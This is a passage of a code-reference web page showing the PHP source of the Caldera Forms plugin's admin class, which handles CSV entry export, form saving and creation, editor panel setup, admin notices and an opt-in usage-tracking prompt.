public&quot;);&nbsp;</div></li><li><div>            header(&quot;Expires: 0&quot;);&nbsp;</div></li><li><div>            header(&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;);&nbsp;</div></li><li><div>            header(&quot;Cache-Control: private&quot;, false);&nbsp;</div></li><li><div>            header(&quot;Content-Type: text/csv charset=$encoding;&quot;);&nbsp;</div></li><li><div>            header(&quot;Content-Disposition: attachment; filename=\&quot;&quot; . sanitize_file_name( $form['name'] ) . &quot;.csv\&quot;;&quot; );&nbsp;</div></li><li><div>            header(&quot;Content-Transfer-Encoding: binary&quot;);&nbsp;</div></li><li><div>            $df = fopen(&quot;php://output&quot;, 'w');&nbsp;</div></li><li><div>            fputcsv($df, $headers);&nbsp;</div></li><li><div>            foreach($data as $row) {&nbsp;</div></li><li><div>                $csvrow = array();&nbsp;</div></li><li><div>                foreach($headers as $key=&gt;$label) {&nbsp;</div></li><li><div>                    if(!isset($row[$key])) {&nbsp;</div></li><li><div>                        $row[$key] = null;&nbsp;</div></li><li><div>                    }else{&nbsp;</div></li><li><div>                        if( is_array( $row[$key] ) && isset( $row[$key]['label'] ) ) {&nbsp;</div></li><li><div>                            $row[$key] = $row[$key]['value'];&nbsp;</div></li><li><div>                        }elseif( is_array( $row[$key] ) ) {&nbsp;</div></li><li><div>                            $subs = array();&nbsp;</div></li><li><div>                            foreach( $row[$key] as $row_part ) {&nbsp;</div></li><li><div>                                if( is_array( $row_part ) && isset( $row_part['label'] ) ) {&nbsp;</div></li><li><div>                                    $subs[] = $row_part['value'];&nbsp;</div></li><li><div>                                }else{&nbsp;</div></li><li><div>                                    $subs[] = $row_part;&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                            $row[$key] = implode(', ', $subs );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    $csvrow[] = $row[$key];&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                fputcsv($df, $row);&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>            fclose($df);&nbsp;</div></li><li><div>            exit;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( isset($_POST['config']) && isset( $_POST['cf_edit_nonce'] ) && current_user_can( Caldera_Forms::get_manage_cap( 'manage' ) ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // if this fails, check_admin_referer() will automatically print a &quot;failed&quot; page and die.&nbsp;</div></li><li><div>            if ( check_admin_referer( 'cf_edit_element', 'cf_edit_nonce' ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                // strip slashes&nbsp;</div></li><li><div>                $data = json_decode( stripslashes_deep($_POST['config']) , ARRAY_A );&nbsp;</div></li><li><div>                self::save_a_form( $data );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if(!empty($_POST['sender'])) {&nbsp;</div></li><li><div>                    exit;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                wp_redirect('admin.php?page=caldera-forms');&nbsp;</div></li><li><div>                die;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Save a form&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.4&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param array $data&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function save_a_form( $data ) {&nbsp;</div></li><li><div>        Caldera_Forms_Forms::save_form( $data );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * AJAX callback for new form creation&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since unknown&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;wp_ajax_create_form&quot; action&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function create_form() {&nbsp;</div></li><li><div>        $nonce_validated = false;&nbsp;</div></li><li><div>        if(  isset( $_POST[ 'nonce' ] ) &&  wp_verify_nonce( $_POST[ 'nonce'], 'cf_create_form' ) ) {&nbsp;</div></li><li><div>            $nonce_validated = true;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        parse_str( $_POST['data'], $newform );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( ! $nonce_validated ) {&nbsp;</div></li><li><div>            if( isset( $newform, $newform[ 'nonce' ] ) ) {&nbsp;</div></li><li><div>                if( wp_verify_nonce( $newform[ 'nonce' ], 'cf_create_form' ) ) {&nbsp;</div></li><li><div>                    $nonce_validated = true;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( ! $nonce_validated ) {&nbsp;</div></li><li><div>            status_header(500);&nbsp;</div></li><li><div>            wp_send_json_error( );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        $newform = Caldera_Forms_Forms::create_form( $newform );&nbsp;</div></li><li><div>        echo $newform['ID'];&nbsp;</div></li><li><div>        exit;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    // get internal panel extensions&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function get_panel_extensions($panels) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $path = CFCORE_PATH . &quot;ui/panels/&quot;;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $internal_panels = array(&nbsp;</div></li><li><div>            'form_layout' =&gt; array(&nbsp;</div></li><li><div>                &quot;name&quot; =&gt;    __( 'Layout', 'caldera-forms' ), &nbsp;</div></li><li><div>                &quot;setup&quot; =&gt;    array(&nbsp;</div></li><li><div>                    &quot;scripts&quot; =&gt;    array(&nbsp;</div></li><li><div>                        'jquery-ui-sortable', &nbsp;</div></li><li><div>                        'jquery-ui-draggable', &nbsp;</div></li><li><div>                        'jquery-ui-droppable', &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;styles&quot; =&gt;    array(&nbsp;</div></li><li><div>                        CFCORE_URL . &quot;assets/css/editor-grid.css&quot;, &nbsp;</div></li><li><div>                        CFCORE_URL . &quot;assets/css/processors-edit.css&quot;&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                &quot;tabs&quot; =&gt;    array(&nbsp;</div></li><li><div>                    &quot;layout&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Layout', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Layout Builder', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;active&quot; =&gt; true, &nbsp;</div></li><li><div>                        &quot;actions&quot; =&gt; array(&nbsp;</div></li><li><div>                            $path . &quot;layout_toolbar.php&quot;&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                        &quot;repeat&quot; =&gt; 0, &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;layout.php&quot;, &nbsp;</div></li><li><div>                        &quot;side_panel&quot; =&gt; $path . &quot;layout_side.php&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;pages&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Pages', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Form Pages', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;pages.php&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;mailer&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Email', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Email Notification Settings', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;emailer.php&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;processors&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Processors', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Form Processors', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;processors.php&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;conditions&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Conditions', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Conditions', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;conditions.php&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;variables&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Variables', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Variables', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;canvas&quot; =&gt; $path . &quot;variables.php&quot;, &nbsp;</div></li><li><div>                        &quot;actions&quot; =&gt; array(&nbsp;</div></li><li><div>                            $path . &quot;variable_add.php&quot;&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                    &quot;responsive&quot; =&gt; array(&nbsp;</div></li><li><div>                        &quot;name&quot; =&gt; __( 'Responsive', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;location&quot; =&gt; &quot;lower&quot;, &nbsp;</div></li><li><div>                        &quot;label&quot; =&gt; __( 'Responsive Settings', 'caldera-forms' ), &nbsp;</div></li><li><div>                        &quot;repeat&quot; =&gt; 0, &nbsp;</div></li><li><div>                        &quot;fields&quot; =&gt; array(&nbsp;</div></li><li><div>                            &quot;break_point&quot; =&gt; array(&nbsp;</div></li><li><div>                                &quot;label&quot; =&gt; __( 'Grid Collapse', 'caldera-forms' ), &nbsp;</div></li><li><div>                                &quot;slug&quot; =&gt; &quot;break_point&quot;, &nbsp;</div></li><li><div>                                &quot;caption&quot; =&gt; __( 'Set the smallest screen size at which to collapse the grid. (based on Bootstrap 3.0)', 'caldera-forms' ), &nbsp;</div></li><li><div>                                &quot;type&quot; =&gt; &quot;radio&quot;, &nbsp;</div></li><li><div>                                &quot;config&quot; =&gt; array(&nbsp;</div></li><li><div>                                    &quot;default&quot; =&gt; &quot;sm&quot;, &nbsp;</div></li><li><div>                                    &quot;option&quot; =&gt; array(&nbsp;</div></li><li><div>                                        &quot;xs&quot; =&gt; array(&nbsp;</div></li><li><div>                                            'value' =&gt; 'xs', &nbsp;</div></li><li><div>                                            'label' =&gt; __('Maintain grid always', 'caldera-forms' ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                                        &quot;sm&quot; =&gt; array(&nbsp;</div></li><li><div>                                            'value' =&gt; 'sm', &nbsp;</div></li><li><div>                                            'label' =&gt; '&lt; 767px'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                                        &quot;md&quot; =&gt; array(&nbsp;</div></li><li><div>                                            'value' =&gt; 'md', &nbsp;</div></li><li><div>                                            'label' =&gt; '&lt; 991px'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                                        &quot;lg&quot; =&gt; array(&nbsp;</div></li><li><div>                                            'value' =&gt; 'lg', &nbsp;</div></li><li><div>                                            'label' =&gt; '&lt; 1199px'&nbsp;</div></li><li><div> )&nbsp;</div></li><li><div> )&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> )&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return array_merge( $panels, $internal_panels );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Add to the admin notices&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.0&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param string|array $notice The notice or array of notices to add.&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function add_admin_notice( $notice ) {&nbsp;</div></li><li><div>        if ( is_string( $notice ) ) {&nbsp;</div></li><li><div>            self::$admin_notices[] = $notice;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( is_array( $notice ) ) {&nbsp;</div></li><li><div>            foreach( $notice as $n) {&nbsp;</div></li><li><div>                self::add_admin_notice( $n );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Get the admin messages&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param bool $as_string Optional. To return as string, the default, or as an array&nbsp;</div></li><li><div>     * @param string $seperator Optional. What to break notices with, when returning as string. Default is &quot;\n&quot;&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return string|array|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static  function get_admin_notices( $as_string = true, $seperator = &quot;\n&quot; ) {&nbsp;</div></li><li><div>        if ( ! empty( self::$admin_notices ) ) {&nbsp;</div></li><li><div>            if ( $as_string ) {&nbsp;</div></li><li><div>                return implode( $seperator, self::$admin_notices );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            }else{&nbsp;</div></li><li><div>                return self::$admin_notices;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Handle admin alert/notices&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.4&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;caldera_forms_admin_footer&quot;&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function admin_alerts() {&nbsp;</div></li><li><div>        $optin_status = Caldera_Forms_Tracking::tracking_optin_status();&nbsp;</div></li><li><div>        if(  'dismiss' !== $optin_status && 0 == $optin_status ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $allow = Caldera_Forms_Tracking::allow_url();&nbsp;</div></li><li><div>            $dismiss = Caldera_Forms_Tracking::dismiss();&nbsp;</div></li><li><div>            $message[] = __( 'Allow us to track basic usage data and receive a 10% discount at CalderaWP.com.', 'caldera-forms' );&nbsp;</div></li><li><div>            $message[] = __( 'No form entries, or sensitive data will be saved.', 'caldera-forms' );&nbsp;</div></li><li><div>            $message[] = __( 'This data is used to help improve Caldera Forms and it will never be shared with a third-party.', 'caldera-forms' );&nbsp;</div></li><li><div>            $message[] = __( 'If you choose to allow us to track data, a 10% discount code for CalderaWP.com will be sent to the admin email for this site.', 'caldera-forms' );&nbsp;</div></li><li><div>            $message[] = sprintf( '&lt;em&gt;&lt;a href=&quot;https://calderaforms.com/?post_type=doc&p=17228&quot; target=&quot;_blank&quot; title=&quot;%s&quot;&gt;%s&lt;/a&gt;&lt;/em&gt;', &nbsp;</div></li><li><div>                esc_html__( 'Information on CalderaWP site about usage tracking', 'caldera-forms' ), &nbsp;</div></li><li><div>                esc_html__( 'Learn more about what is tracked here.', 'caldera-forms' )&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>            $message = '&lt;p&gt;' . implode( ' ', $message ) . '&lt;/p&gt;';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $message .= sprintf( '&lt;p style=&quot;display:inline;float:left;&quot; &gt;&lt;a type=&quot;button&quot; class=&quot;button button-secondary&quot; href=&quot;%s&quot;&gt;%s&lt;/a&gt;&lt;/p&gt;', esc_url_raw( $dismiss ), __( 'No Thanks', 'caldera-forms' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $message .= sprintf( '&lt;p style=&quot;display:inline; float:right;&quot;&gt;&lt;a type=&quot;button&quot; class=&quot;button button-primary&quot; href=&quot;%s&quot;&gt;%s&lt;/a&gt;', esc_url_raw( $allow ), __( 'Help Us & Save', 'caldera-forms' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            self::create_admin_notice( __( 'Help us improve Caldera Forms & Get 10% Off At CalderaWP.com', 'caldera-forms' ), $message, false );&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            $notices = self::get_admin_alerts();&nbsp;</div></li><li><div>            if( ! empty( $notices ) ) {&nbsp;</div></li><li><div>                shuffle( $notices );&nbsp;</div></li><li><div>                $notice = $notices[0];&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if( is_array( $notice ) && isset( $notice[ 'title' ], $notice[ 'content' ] ) ) {&nbsp;</div></li><li><div>                    unset( $notices[0]);&nbsp;</div></li><li><div>                    update_option( '_cf_admin_alerts', $notices );&nbsp;</div></li><li><div>                    self::create_admin_notice( $notice[ 'title' ], $notice[ 'content' ] );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Create an admin notice&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.4&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param $title&nbsp;</div></li><li><div>     * @param $content&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function create_admin_notice( $title, $content, $sanitize = true ) {&nbsp;</div></li><li><div>        if( $sanitize ) {&nbsp;</div></li><li><div>            $content = wp_kses( $content, wp_kses_allowed_html( 'post' ) );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        ?&gt;&nbsp;</div></li><li><div>        &lt;div&nbsp;</div></li><li><div>            class=&quot;ajax-trigger&quot;&nbsp;</div></li><li><div>            data-modal=&quot;cf-admin-notice&quot;&nbsp;</div></li><li><div>            data-modal-title=&quot;&lt;?php echo esc_html( $title ); ?&gt;&quot;&nbsp;</div></li><li><div>            data-template=&quot;#&lt;?php echo esc_attr( sanitize_key( 'admin-modal' .  $title ) ); ?&gt;&quot;&nbsp;</div></li><li><div>            data-modal-height=&quot;300&quot;&nbsp;</div></li><li><div>            data-modal-width=&quot;650&quot;&nbsp;</div></li><li><div>            data-autoload=&quot;true&quot;&nbsp;</div></li><li><div>        &gt;&nbsp;</div></li><li><div>        &lt;/div&gt;&nbsp;</div></li><li><div>        &lt;script type=&quot;text/html&quot; id=&quot;&lt;?php echo esc_attr( sanitize_key('admin-modal' . $title ) ); ?&gt;&quot;&gt;&nbsp;</div></li><li><div>            &lt;?php echo $content; ?&gt;&nbsp;</div></li><li><div>        &lt;/script&gt;&nbsp;</div></li><li><div>        &lt;?php&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Get any admin alert/notices from remote API&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.4&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return array|mixed|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function get_admin_alerts() {&nbsp;</div></li><li><div>        $notices = get_option( '_cf_admin_alerts', array() );&nbsp;</div></li><li><div>        if( ! is_array( $notices) ) {&nbsp;</div></li><li><div>            $notices = array();&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $day_ago = time() - DAY_IN_SECONDS;&nbsp;</div></li><li><div>        $last_check = get_option( '_cf_last_alert_check', false );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( false === $last_check || $day_ago &gt; $last_check ) {&nbsp;</div></li><li><div>            $url = Caldera_Forms_Tracking::api_url( 'notices' );&nbsp;</div></li><li><div>            $r_notices = Caldera_Forms_Tracking::send_to_api( $url );&nbsp;</div></li><li><div>            if ( ! empty( $r_notices ) ) {&nbsp;</div></li><li><div>                if( is_string( $r_notices ) ) {&nbsp;</div></li><li><div>                    $r_notices = json_decode( $r_notices );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if( is_object( $r_notices ) ) {&nbsp;</div></li><li><div>                    $r_notices = (array) $r_notices;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if ( is_array( $r_notices ) ) {&nbsp;</div></li><li><div>                    $notices = array_merge($notices, $r_notices);&nbsp;</div></li><li><div>                    update_option('_cf_admin_alerts', $notices);&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        update_option( '_cf_last_alert_check', time() );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $notices;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Watch for tracking optin change and update if needed&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;admin_init&quot;&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.5&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function watch_tracking() {&nbsp;</div></li><li><div>        if( isset( $_GET[ 'cal_tracking' ], $_GET[ 'cal_tracking_nonce' ] ) ) {&nbsp;</div></li><li><div>            if( wp_verify_nonce( $_GET[ 'cal_tracking_nonce' ] ) ) {&nbsp;</div></li><li><div>                $value = $_GET[ 'cal_tracking' ];&nbsp;</div></li><li><div>                if( is_numeric(  $value ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    update_option( '_caldera_forms_tracking_allowed', absint( $value ) );&nbsp;</div></li><li><div>                    if( 1 == $value ) {&nbsp;</div></li><li><div>                        $response = wp_remote_get( add_query_arg( 'cf-optin-email', urlencode( get_option( 'admin_email') ), 'http://CalderaWP.com/' ) );&nbsp;</div></li><li><div>                        /**&nbsp;</div></li><li><div>                         * Runs after tracking optin is sent to CalderaWP.com&nbsp;</div></li><li><div>                         *&nbsp;</div></li><li><div>                         * @since 1.3.5&nbsp;</div></li><li><div>                         *&nbsp;</div></li><li><div>                         * @param array|WP_Error Response data or WP_Error&nbsp;</div></li><li><div>                         */&nbsp;</div></li><li><div>                        add_action( 'caldera_form_after_tracking_optin', $response );&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }elseif( 'dismiss' == trim( $value ) ) {&nbsp;</div></li><li><div>                    update_option( '_caldera_forms_tracking_allowed', trim( $value ) );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Add Easy Pods as an auto-populate option in admin&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.4.3&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;caldera_forms_prerender_edit&quot; action&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function  easy_pods_auto_populate() {&nbsp;</div></li><li><div>        if( version_compare( phpversion(), '5.3.0', '&gt;=' ) ) {&nbsp;</div></li><li><div>            if( class_exists( 'Caldera_Easy_Pods' ) ) {&nbsp;</div></li><li><div>                new Caldera_Forms_Admin_APEasyPods;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if( defined( 'CAEQ_PATH' ) ) {&nbsp;</div></li><li><div>                new Caldera_Forms_Admin_APEasyQueries;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Remove hooks for admin notices while in Caldera Forms admin&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * Caldera Forms admin does not play nice with admin notices, so we use a series of steps to remove most of them, sadly can not beat them all.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.4.7&nbsp;</div></li><li><div>     * @uses &quot;admin_head&quot; action&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function remove_notice_actions() {&nbsp;</div></li><li><div>        remove_all_actions( 'admin_notices' );&nbsp;</div></li><li><div>        remove_all_actions( 'network_admin_notices' );&nbsp;</div></li><li><div>        remove_all_actions( 'user_admin_notices' );&nbsp;</div></li><li><div>        remove_all_actions( 'all_admin_notices' );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Check if is a Caldera Forms page&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.5.0.9&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param null|string $page Optional. Pass page name (get var) for sub page&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return bool&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function is_page( $page = null ) {&nbsp;</div></li><li><div>        if( is_admin() && isset( $_GET[ 'page' ] ) ) {&nbsp;</div></li><li><div>            if( is_null( $page ) ) {&nbsp;</div></li><li><div>                return  Caldera_Forms::PLUGIN_SLUG == $_GET[ 'page' ];&nbsp;</div></li><li><div>            }elseif ( is_string( $page ) ) {&nbsp;</div></li><li><div>                return  $page == $_GET[ 'page' ];&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return false;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Check if is form editor page&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.5.0.9&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return bool&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function is_edit() {&nbsp;</div></li><li><div>        return Caldera_Forms_Admin::is_page() && isset( $_GET[ 'edit' ] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Check if is main admin page&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.5.0.9&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return bool&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function is_main_page() {&nbsp;</div></li><li><div>        return Caldera_Forms_Admin::is_page() && ! isset( $_GET[ 'edit' ] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>}&nbsp;</div></li></ol></pre></dd></dl> </section> </article></div><div id="sidebar"><ul class="widgets"><li> <a href="http://hookr.io/plugin/"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/plugin-download.jpg" /></a></li><li id="versions"><dl><dt>Version(s)</dt><dd><dl><dt>Since</dt><dd> 1.5.0.5</dd><dt>Others</dt><dd><ul><li><a href="http://hookr.io/plugins/caldera-forms/1.5.0.9/classes/caldera_forms_admin/" class="active">1.5.0.9</a></li><li><a href="http://hookr.io/plugins/caldera-forms/1.5.0.8/classes/caldera_forms_admin/" class="">1.5.0.8</a></li><li><a href="http://hookr.io/plugins/caldera-forms/1.5.0.7/classes/caldera_forms_admin/" class="">1.5.0.7</a></li><li><a href="http://hookr.io/plugins/caldera-forms/1.5.0.6/classes/caldera_forms_admin/" class="">1.5.0.6</a></li><li><a href="http://hookr.io/plugins/caldera-forms/1.5.0.5/classes/caldera_forms_admin/" class="">1.5.0.5</a></li></ul></dd></dl></dd></dl></li><li id="tags"><dl><dt>Tags</dt><dd><ul><li><span></span>plugin</li><li><span></span>class</li><li><span></span>Caldera_Forms_Admin</li><li><span></span>wp-plugin</li></ul></dd></dl></li></ul></div></div></div><script>Hookr.View.init();Hookr.Single.init();</script><footer><div><ul id="nav-social" class="pivot" role="navigation"><li id="twitter"><a 